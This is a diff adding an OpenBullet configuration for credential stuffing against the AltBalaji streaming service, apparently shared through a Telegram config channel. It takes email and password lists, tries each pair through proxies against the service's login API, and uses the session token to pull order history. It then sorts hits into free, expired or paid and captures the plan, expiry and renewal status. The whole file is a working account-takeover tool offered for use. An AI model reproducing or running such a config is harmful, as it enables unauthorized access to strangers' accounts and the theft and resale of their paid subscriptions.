@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "AltBalaji",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-22T14:30:10.4158248-08:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login_req REQUEST POST "https://api.cloud.altbalaji.com/accounts/login?domain=IN" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.altbalaji.com" 
+  HEADER "referer: https://www.altbalaji.com/subscribe" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+#KEYCHK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Username and password do not match\"" 
+    KEY "\"Username not found\"" 
+    KEY "Account does not exist" 
+    KEY "Bad request data" 
+  KEYCHAIN Success OR 
+    KEY "login\":\"" 
+    KEY "\"id\":" 
+
+PARSE "<SOURCE>" LR "session_token\":\"" "\"" -> VAR "token" 
+
+#get_req REQUEST GET "https://payment.cloud.altbalaji.com/accounts/orders?limit=12&order_status=ok&domain=IN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "xssession: <token>" 
+
+#KEYCHK KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"orders\":[]," 
+    KEY "\"count\":0," 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\"count\":0," 
+    KEY "<SOURCE>" DoesNotContain "\"orders\":[]," 
+
+PARSE "<SOURCE>" LR "valid_to\":\"" "T" -> VAR "EXPIRE" 
+
+#fn FUNCTION CurrentUnixTime -> VAR "CURRENT" 
+
+#fn FUNCTION UnixTimeToISO8601 "<CURRENT>" -> VAR "ISO" 
+
+#fn FUNCTION Substring "0" "10" "<ISO>" -> VAR "STRING" 
+
+#fn FUNCTION Replace "-" "" "<STRING>" -> VAR "REPLACE" 
+
+#fn FUNCTION Replace "-" "" "<EXPIRE>" -> VAR "REMOVE" 
+
+#fn FUNCTION Constant "ODEwMTc5NTAzMTc0NDUxMjQx.YCf75g.7g5x3c1K6LBbkjmTwHbRXyRnR3k" -> VAR "x" 
+
+#fn FUNCTION Constant "ibqctggbyzijquuc" -> VAR "vhtsrFgre8hgh54fs52hjfXXmhqa" 
+
+#KEYCHK KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<REMOVE>" LessThan "<REPLACE>" 
+    KEY "<REMOVE>" EqualTo "<REPLACE>" 
+    KEY "<REPLACE>" GreaterThan "<REMOVE>" 
+  KEYCHAIN Success OR 
+    KEY "<REPLACE>" LessThan "<REMOVE>" 
+    KEY "<REMOVE>" GreaterThan "<REPLACE>" 
+
+PARSE "<SOURCE>" LR "valid_to\":\"" "T" -> CAP "Expiry" 
+
+PARSE "<SOURCE>" LR ",\"en\":\"" "\"" -> CAP "Current Plan" 
+
+PARSE "<SOURCE>" LR "recurring\":" "," -> CAP "Renewal" 
+
